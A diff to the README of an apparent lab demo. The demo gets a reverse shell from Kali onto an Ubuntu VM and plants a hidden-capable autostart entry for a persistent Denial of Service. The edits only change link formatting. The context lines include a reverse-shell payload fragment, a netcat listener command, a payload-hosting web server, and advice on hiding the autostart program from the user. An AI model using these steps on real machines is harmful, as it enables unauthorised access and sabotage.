@@ -9,7 +9,7 @@ The goal of the demo is to create a persistent Denial of Service on an Ubuntu vi
 
 ## Kali Preparation
 First of all, all the necessary files were created on Kali.
-First, the `reverseshell.sh` file, where the is the [payload] in python 
+First, the `reverseshell.sh` file, where the is the [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)[1] in python 
 ```py
 export RHOST="10.0.2.2";
 export RPORT=4444;
@@ -46,12 +46,12 @@ Comment=
 ```
 It will be used to insert the program that executes the Denial of Service among the applications that open at the start of the machine.
 The Hidden and NoDisplay flags, to highlight the Denial of Service, have been set to false, if they are set to true, the program runs without the user noticing anything, so the machine is slowed down without being able to understand the reason.
-Once the files were created, a [web file server] was also created on port 80, using the command.
+Once the files were created, a [web file server][2] was also created on port 80, using the command.
 `python -m http.server 80`
 
 ![Web File Server](images/webfileserverdemo.png)
 
-At this point, the only thing left to do is to listen on the default port, to do this it was used [netcat], with the command: `nc -lvp 4444 -n`
+At this point, the only thing left to do is to listen on the default port, to do this it was used [netcat][3], with the command: `nc -lvp 4444 -n`
 
 # Reverse shell 
 
@@ -78,8 +78,8 @@ To stop this attack you might think of deleting the `dos` executable, but in cas
 Alternatively, you could think of deleting the `dos.desktop` file, but given that it is located in a directory that is hidden by default and given that the terminal is unusable, this could be difficult.
 
 ## References
-1. [Payload]: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
-2. [web file server]: https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88
-3. [netcat]: https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/
+1. https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+2. https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88
+3. https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/
 
 
